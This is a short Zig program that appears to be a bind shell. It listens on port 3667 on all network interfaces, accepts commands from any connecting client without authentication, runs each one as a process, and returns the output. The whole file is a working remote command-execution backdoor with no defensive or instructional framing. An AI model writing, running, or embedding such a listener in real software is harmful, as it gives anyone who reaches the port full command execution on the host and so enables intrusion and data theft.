const std = @import("std");
const print = std.debug.print;
const Child = std.process.Child;
const ArrayList = std.ArrayList;
const mem = std.mem;

pub fn executeCommand(allocator: std.mem.Allocator, command: []const u8) ![]const u8 {
    var argv = ArrayList([]const u8).init(allocator);
    defer argv.deinit();

    var iterator = mem.splitScalar(u8, command, ' ');
    while (iterator.next()) |arg| {
        try argv.append(arg);
    }

    var child = Child.init(argv.items, allocator);
    child.stdout_behavior = .Pipe;
    child.stderr_behavior = .Pipe;

    var stdout = ArrayList(u8).init(allocator);
    var stderr = ArrayList(u8).init(allocator);
    defer stderr.deinit();

    try child.spawn();
    try child.collectOutput(&stdout, &stderr, 1024);
    _ = try child.wait();

    if (stderr.items.len > 0) {
        try stdout.appendSlice("\nErrors:\n");
        try stdout.appendSlice(stderr.items);
    }

    return stdout.toOwnedSlice();
}

pub fn main() !void {
    var gpa_alloc = std.heap.GeneralPurposeAllocator(.{}){};
    defer std.debug.assert(gpa_alloc.deinit() == .ok);
    const gpa = gpa_alloc.allocator();

    const addr = std.net.Address.initIp4(.{ 0, 0, 0, 0 }, 3667);
    var server = try addr.listen(.{});
    std.log.info("Server listening on port 3667", .{});

    while (true) {
        var client = try server.accept();
        defer client.stream.close();

        const client_reader = client.stream.reader();
        const client_writer = client.stream.writer();

        while (true) {
            const command = try client_reader.readUntilDelimiterOrEofAlloc(gpa, '\n', 65536) orelse break;
            defer gpa.free(command);

            std.log.info("Received command: \"{s}\"", .{command});

            const output = try executeCommand(gpa, command);
            defer gpa.free(output);

            try client_writer.writeAll(output);
            try client_writer.writeByte('\n');
        }
    }
}
